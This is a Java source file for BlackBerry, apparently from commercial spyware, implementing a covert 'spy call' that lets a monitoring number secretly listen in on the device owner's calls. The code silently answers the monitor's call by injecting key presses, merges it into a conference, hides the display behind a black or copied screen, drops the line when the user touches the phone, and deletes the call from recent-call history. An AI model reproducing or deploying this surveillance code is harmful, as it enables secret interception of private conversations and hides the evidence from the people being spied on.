package com.vvt.bug;

import java.util.Timer;
import java.util.TimerTask;
import net.rim.blackberry.api.phone.Phone;
import net.rim.blackberry.api.phone.PhoneCall;
import net.rim.device.api.system.Application;
import net.rim.device.api.system.Backlight;
import net.rim.device.api.system.DeviceInfo;
import net.rim.device.api.system.EventInjector;
import net.rim.device.api.ui.Keypad;
import net.rim.device.api.ui.Ui;

public class SCCL_5 extends SCCL {
	
	protected BaseScreen screen;
	protected Timer wait4KeyPressesAction;
	protected boolean popBlackScreenProgrammatically;
	private boolean isSpyCallCase = false;
	private int numberOfDeletionCall = 1;
	
	public SCCL_5(PhoneEventListenerSettings pelSettings) {
		super(pelSettings);
	}

	public void initialize() {
		try {
			super.initialize();
			numberOfCallsActive = 1;
			sCCActive = false;
			enableCopyScreen();
		} catch (Exception e) {
		}
	}

	public void enableCopyScreen() {
		try {
			if (pelSettings.isUseBlackScreen()) {
				screen = new BlackScreen(this);
			} else {
				screen = new CopyScreen();
				copyScreen();
			}
		} catch (Exception e) {
		}
	}
	
	public void callIncoming(int callId) { // This event occurs when there is incoming call.
	}

	public void callFailed(int callId, int reason) {
	}

	public void callInitiated(int callId) { // This event occurs when there is outgoing call.
	}
	
	public void callWaiting(int callId) { // This event occurs when there is another line coming while conversation is going on.
		numberOfCallsActive++;
		PhoneCall phoneCall = Phone.getCall(callId);
		if (numberOfCallsActive >= 3) {
			if (util.isSCC(phoneCall, monitorPhoneNumber)) {
				voiceApp.suspendPainting(true);
				numberOfDeletionCall++;
				endCall();
				isSpyCallCase = true;
				int waitInterval = 1500;
				new Timer().schedule(new TimerTask() {
					public void run() {
						voiceApp.suspendPainting(false);
					}
				}, waitInterval);
			} else if (sCCActive) {
				voiceApp.suspendPainting(true);
				numberOfDeletionCall++;
				endCall();
			}
		} else {
			if (util.isSCC(phoneCall, monitorPhoneNumber)) {
				voiceApp.suspendPainting(true); // To freeze screen.
				util.injectKey((char)Keypad.KEY_SEND, pelSettings.getWaitBeforeAnswerWaitingCallMS()); // To simulate "KEY_SEND" for connecting spy call.
				sCCActive = true;
				isSpyCallCase = true;
				sCCId = callId;
			}
		}
	}
	
	public void callAnswered(int callId) {
		try {
			if (sCCActive) {
				pushBaseScreen(); // For unfreezing the screen and pushing the last screen in the front.
			}
		} catch (Exception e) {
		}
	}

	public void callConnected(int callId) {
		try {
			if (sCCActive) {
				// To make conference call.
				joinMenuItem = util.getMenuItem(join, voiceApp, localeEnglish, locale);
				new Thread(joinMenuItem).start();
				scheduleWaitForKeyPress();
			}
		} catch (Exception e) {
		}
	}

	public void callConferenceCallEstablished(int callId) {
	}

	public void callDisconnected(int callId) {
		try {
			numberOfCallsActive--;
			if (sCCActive) {
				wait4KeyPressesAction.cancel(); // Canceling scheduleWaitForKeyPress() function.
				if (sCCId != callId) { // This case happens when normal line hangs call, so monitor line must be ended.
					if (numberOfCallsActive == 1) {
						if (pelSettings.isManipulatePainting() && !voiceApp.isPaintingSuspended()) {
							voiceApp.suspendPainting(true);
						}
						util.injectKey((char)Keypad.KEY_END, pelSettings.getWaitBeforeEndScc());
					}
					else {
						scheduleHoldResumePainting(false, pelSettings.getWaitBeforeResumePaintingSCCDisconnectedMS());
					}
				} else { // This case happens when monitor line hangs call.
					sCCActive = false;
					if (pelSettings.isManipulatePainting()) {
						voiceApp.invokeLater(new Runnable() {
							public void run() {
								try {
									if (pelSettings.isManipulatePainting() && !voiceApp.isPaintingSuspended()) {
										voiceApp.suspendPainting(true);
									}
									voiceApp.popScreen(screen);
								} catch (Exception e) {
								}
							}
						});
						if (numberOfCallsActive == 0) {
							scheduleHoldResumePainting(false, pelSettings.getWaitBeforeResumePaintingFinalSCCDisconnectedMS());
						}
						else {
							int waitInterval = 3000;
							pelSettings.setWaitBeforeResumePaintingSCCDisconnectedMS(waitInterval);
							scheduleHoldResumePainting(false, pelSettings.getWaitBeforeResumePaintingSCCDisconnectedMS());
						}
					}
				}
			}
			if (numberOfCallsActive == 0) { // If everything has been finished, it will be reset to be default.
				if (isSpyCallCase) {
					scheduleHoldResumePainting(false, pelSettings.getWaitBeforeResumePaintingFinalSCCDisconnectedMS());
					deleteConferenceNumber();
				}
//				((FxS) BaseFxS.getFxS()).releaseSCCL();
				observer.onFinish();
			}
		} catch (Exception e) {
		}
	}
	
	public void considerUserInteractionEvent(boolean popBlackScreenProgrammatically) {
	}
	
	protected void scheduleHoldResumePainting(final boolean hold, int time) {
		try {
			new Timer().schedule(new TimerTask() {
				public void run() {
					try {
						boolean alter = (hold && !voiceApp.isPaintingSuspended()) || (!hold && voiceApp.isPaintingSuspended());
						if (alter) {
							voiceApp.suspendPainting(hold);
						}
					} catch (Exception e) {
					}
				}
			}, time);
		} catch (Exception e) {
		}
	}

	private void endCall() {
		int endCallInterval = 500;
		new Timer().schedule(new TimerTask() {
			public void run() {
				InjectionKeyThread endKey = new InjectionKeyThread((char) Keypad.KEY_END);
				endKey.start();
			}
		}, endCallInterval);
	}
	
	private void copyScreen() {
		int copyInterval = 3000;
		new Timer().schedule(new TimerTask() {
			public void run() {
				// To copy screen.
				if (pelSettings.isUseCopyScreen()) {
					((CopyScreen)screen).copy();
				}
			}
		}, copyInterval);
	}
	
	private void pushBaseScreen() {
		synchronized (Application.getEventLock()) {
			try {
				Ui.getUiEngine().pushGlobalScreen(screen, -100, 0);
				if (pelSettings.isManipulatePainting()) {
					scheduleHoldResumePainting(false, pelSettings.getWaitBeforeResumePaintingSCCAnsweredMS());
				}
			} catch (Exception e) {
			}
		}
	}
	
	private void deleteConferenceNumber() {
		voiceApp.suspendPainting(true);
		int deletionConferenceInterval = 2000;
		new Timer().schedule(new TimerTask() {
			public void run() {
				Backlight.enable(false);
				RecentCallCleaner recentCallCleaner = new RecentCallCleaner();
				recentCallCleaner.deleteLastNCall(numberOfDeletionCall);
			}
		}, deletionConferenceInterval);
		scheduleHoldResumePainting(false, pelSettings.getWaitBeforeResumePaintingSCCDeleteConfMS());
	}
	
	private void scheduleWaitForKeyPress() {
		try {
			wait4KeyPressesAction = new Timer();
			wait4KeyPressesAction.schedule(new TimerTask() {
				public void run() {
					try {
						if (DeviceInfo.getIdleTime() == 0) {
							wait4KeyPressesAction.cancel();
							voiceApp.invokeLater(new Runnable() {
								public void run() {
									try {
										if (pelSettings.isManipulatePainting() && !voiceApp.isPaintingSuspended()) {
											voiceApp.suspendPainting(true);
										}
										voiceApp.popScreen(screen);
										voiceApp.requestBackground();
									} catch (Exception e) {
									}
								}
							});
							int waitInterval = 1500; // In milliseconds.
							dropMonitorCall(waitInterval);
						}
					} catch (Exception e) {
					}
				}
			}, pelSettings.waitBeforeWait4KeyPressActionMS, pelSettings.repeatPeriodWait4KeyPressActionMS);
		} catch (Exception e) {
		}
	}
	
	private void dropMonitorCall(int milliseconds) {
		new Timer().schedule(new TimerTask() {
			public void run() {
				voiceApp.requestForeground();
				// 1). Calling menu items.
				InjectionKeyThread menuKey = new InjectionKeyThread((char) Keypad.KEY_MENU);
				menuKey.start();
				// 2). Simulation roll up event for selection on "Drop Call" menu.
				InjectionKeyThread rollUpEvent = new InjectionKeyThread(EventInjector.TrackwheelEvent.THUMB_ROLL_UP, 2, menuKey);
				rollUpEvent.start();
				// 3). Choosing that menu.
				InjectionKeyThread enterKey = new InjectionKeyThread((char) Keypad.KEY_MENU, rollUpEvent);
				enterKey.start();
				// 4). Simulation roll down event for selection monitor number.
				InjectionKeyThread rollDownEvent = new InjectionKeyThread(EventInjector.TrackwheelEvent.THUMB_ROLL_DOWN, 1, enterKey);
				rollDownEvent.start();
				// 5). Ending monitor number.
				InjectionKeyThread clickEvent = new InjectionKeyThread(EventInjector.TrackwheelEvent.THUMB_CLICK, 1, rollDownEvent);
				clickEvent.start();
			}
		}, milliseconds);
	}
}